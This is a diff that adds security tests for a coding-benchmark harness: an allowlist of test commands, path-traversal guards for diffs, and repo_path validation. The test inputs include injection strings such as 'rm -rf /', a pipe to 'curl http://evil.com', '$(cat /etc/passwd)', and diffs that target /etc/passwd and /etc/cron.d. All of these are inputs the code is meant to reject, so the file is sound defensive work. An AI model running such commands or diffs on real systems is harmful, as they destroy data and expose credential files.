@@ -17,6 +17,8 @@ import {
   loadSweBenchDataset,
   applyDiff,
   runTests,
+  isSafeTestCommand,
+  isDiffSafe,
   type BenchTask,
   type BenchReport,
   type EngineRunner,
@@ -475,6 +477,252 @@ describe('loadSweBenchDataset', () => {
     fs.writeFileSync(tmpFile, '');
     const tasks = loadSweBenchDataset(tmpFile);
     expect(tasks).toHaveLength(0);
+  });
+});
+
+// ---------------------------------------------------------------------------
+// Security: HIGH-1 — isSafeTestCommand allowlist + runTests guard
+// ---------------------------------------------------------------------------
+
+describe('isSafeTestCommand — allowlist validation', () => {
+  it('accepts pytest', () => {
+    expect(isSafeTestCommand('pytest tests/')).toBe(true);
+  });
+
+  it('accepts python -m pytest', () => {
+    expect(isSafeTestCommand('python -m pytest tests/queryset/')).toBe(true);
+  });
+
+  it('accepts npm test', () => {
+    expect(isSafeTestCommand('npm test')).toBe(true);
+  });
+
+  it('accepts npm run test', () => {
+    expect(isSafeTestCommand('npm run test')).toBe(true);
+  });
+
+  it('accepts yarn test', () => {
+    expect(isSafeTestCommand('yarn test')).toBe(true);
+  });
+
+  it('accepts cargo test', () => {
+    expect(isSafeTestCommand('cargo test')).toBe(true);
+  });
+
+  it('accepts go test', () => {
+    expect(isSafeTestCommand('go test ./...')).toBe(true);
+  });
+
+  it('accepts vitest', () => {
+    expect(isSafeTestCommand('vitest run')).toBe(true);
+  });
+
+  it('accepts jest', () => {
+    expect(isSafeTestCommand('jest --testPathPattern=foo')).toBe(true);
+  });
+
+  it('rejects semicolon injection', () => {
+    expect(isSafeTestCommand('pytest tests/; rm -rf /')).toBe(false);
+  });
+
+  it('rejects pipe injection', () => {
+    expect(isSafeTestCommand('pytest tests/ | curl http://evil.com')).toBe(false);
+  });
+
+  it('rejects ampersand injection', () => {
+    expect(isSafeTestCommand('pytest tests/ & whoami')).toBe(false);
+  });
+
+  it('rejects $() command substitution', () => {
+    expect(isSafeTestCommand('pytest $(cat /etc/passwd)')).toBe(false);
+  });
+
+  it('rejects backtick command substitution', () => {
+    expect(isSafeTestCommand('pytest `whoami`')).toBe(false);
+  });
+
+  it('rejects > redirect', () => {
+    expect(isSafeTestCommand('pytest tests/ > /tmp/out')).toBe(false);
+  });
+
+  it('rejects < redirect', () => {
+    expect(isSafeTestCommand('pytest < /etc/passwd')).toBe(false);
+  });
+
+  it('rejects ../ path traversal in command', () => {
+    expect(isSafeTestCommand('pytest ../../etc/passwd')).toBe(false);
+  });
+
+  it('rejects newline injection', () => {
+    expect(isSafeTestCommand('pytest tests/\nrm -rf /')).toBe(false);
+  });
+
+  it('rejects unknown binary', () => {
+    expect(isSafeTestCommand('bash run_tests.sh')).toBe(false);
+  });
+
+  it('rejects arbitrary shell command', () => {
+    expect(isSafeTestCommand('curl http://evil.com')).toBe(false);
+  });
+});
+
+describe('runTests — unsafe command rejected without execution', () => {
+  it('returns ok:false and "unsafe test command rejected" for shell metacharacter command', () => {
+    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'ashlr-safe-'));
+    try {
+      const res = runTests('pytest tests/; rm -rf /tmp/canary', dir);
+      expect(res.ok).toBe(false);
+      expect(res.output).toBe('unsafe test command rejected');
+    } finally {
+      try { fs.rmSync(dir, { recursive: true, force: true }); } catch { /* ok */ }
+    }
+  });
+
+  it('returns ok:false and "unsafe test command rejected" for unlisted binary', () => {
+    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'ashlr-safe2-'));
+    try {
+      const res = runTests('bash attack.sh', dir);
+      expect(res.ok).toBe(false);
+      expect(res.output).toBe('unsafe test command rejected');
+    } finally {
+      try { fs.rmSync(dir, { recursive: true, force: true }); } catch { /* ok */ }
+    }
+  });
+});
+
+// ---------------------------------------------------------------------------
+// Security: HIGH-2 — isDiffSafe + applyDiff path-traversal guard
+// ---------------------------------------------------------------------------
+
+describe('isDiffSafe — diff path validation', () => {
+  it('accepts a normal relative-path diff', () => {
+    const diff = [
+      '--- a/src/math.js',
+      '+++ b/src/math.js',
+      '@@ -1 +1 @@',
+      '-old',
+      '+new',
+    ].join('\n');
+    expect(isDiffSafe(diff)).toBe(true);
+  });
+
+  it('rejects diff with absolute path in --- header', () => {
+    const diff = [
+      '--- /etc/passwd',
+      '+++ /etc/passwd',
+      '@@ -1 +1 @@',
+      '-root:x:0:0:root',
+      '+evil',
+    ].join('\n');
+    expect(isDiffSafe(diff)).toBe(false);
+  });
+
+  it('rejects diff with ../ traversal in +++ header', () => {
+    const diff = [
+      '--- a/src/file.ts',
+      '+++ b/../../../etc/cron.d/evil',
+      '@@ -1 +1 @@',
+      '-x',
+      '+y',
+    ].join('\n');
+    expect(isDiffSafe(diff)).toBe(false);
+  });
+
+  it('rejects diff with ../ in diff --git line', () => {
+    const diff = 'diff --git a/../escape/file.ts b/../escape/file.ts\n--- a/../escape/file.ts\n+++ b/../escape/file.ts\n';
+    expect(isDiffSafe(diff)).toBe(false);
+  });
+});
+
+describe('applyDiff — traversal rejection', () => {
+  it('returns "traversal-rejected" for a diff with absolute paths', () => {
+    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'ashlr-trav-'));
+    try {
+      const diff = [
+        '--- /etc/passwd',
+        '+++ /etc/passwd',
+        '@@ -1 +1 @@',
+        '-root',
+        '+evil',
+        '',
+      ].join('\n');
+      const result = applyDiff(diff, dir);
+      expect(result).toBe('traversal-rejected');
+    } finally {
+      try { fs.rmSync(dir, { recursive: true, force: true }); } catch { /* ok */ }
+    }
+  });
+
+  it('returns "traversal-rejected" for a diff with ../ in path', () => {
+    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'ashlr-trav2-'));
+    try {
+      const diff = [
+        '--- a/../../escape.ts',
+        '+++ b/../../escape.ts',
+        '@@ -1 +1 @@',
+        '-x',
+        '+y',
+        '',
+      ].join('\n');
+      const result = applyDiff(diff, dir);
+      expect(result).toBe('traversal-rejected');
+    } finally {
+      try { fs.rmSync(dir, { recursive: true, force: true }); } catch { /* ok */ }
+    }
+  });
+});
+
+// ---------------------------------------------------------------------------
+// Security: LOW-2 — repo_path validation in loadSweBenchDataset
+// ---------------------------------------------------------------------------
+
+describe('loadSweBenchDataset — repo_path validation (LOW-2)', () => {
+  let tmpFile: string;
+
+  beforeEach(() => {
+    tmpFile = path.join(os.tmpdir(), `ashlr-sec-${Date.now()}.jsonl`);
+  });
+
+  afterEach(() => {
+    try { fs.unlinkSync(tmpFile); } catch { /* ok */ }
+  });
+
+  it('accepts a task with an absolute repo_path (no repoBasePath)', () => {
+    fs.writeFileSync(
+      tmpFile,
+      JSON.stringify({ instance_id: 'a', problem_statement: 'p', repo: 'r', repo_path: '/repos/myrepo', test_cmd: 'pytest', FAIL_TO_PASS: [] }),
+    );
+    const tasks = loadSweBenchDataset(tmpFile);
+    expect(tasks).toHaveLength(1);
+    expect(tasks[0]!.repoPath).toBe('/repos/myrepo');
+  });
+
+  it('rejects a task with a relative repo_path', () => {
+    fs.writeFileSync(
+      tmpFile,
+      JSON.stringify({ instance_id: 'b', problem_statement: 'p', repo: 'r', repo_path: 'relative/path', test_cmd: 'pytest', FAIL_TO_PASS: [] }),
+    );
+    const tasks = loadSweBenchDataset(tmpFile);
+    expect(tasks).toHaveLength(0);
+  });
+
+  it('rejects a task with ../ traversal outside repoBasePath', () => {
+    fs.writeFileSync(
+      tmpFile,
+      JSON.stringify({ instance_id: 'c', problem_statement: 'p', repo: 'r', repo_path: '/repos/../etc/evil', test_cmd: 'pytest', FAIL_TO_PASS: [] }),
+    );
+    const tasks = loadSweBenchDataset(tmpFile, '/repos');
+    expect(tasks).toHaveLength(0);
+  });
+
+  it('accepts a task whose resolved repo_path is inside repoBasePath', () => {
+    fs.writeFileSync(
+      tmpFile,
+      JSON.stringify({ instance_id: 'd', problem_statement: 'p', repo: 'org/project', test_cmd: 'pytest', FAIL_TO_PASS: [] }),
+    );
+    const tasks = loadSweBenchDataset(tmpFile, '/repos');
+    expect(tasks).toHaveLength(1);
+    expect(tasks[0]!.repoPath).toBe('/repos/org__project');
   });
 });
 
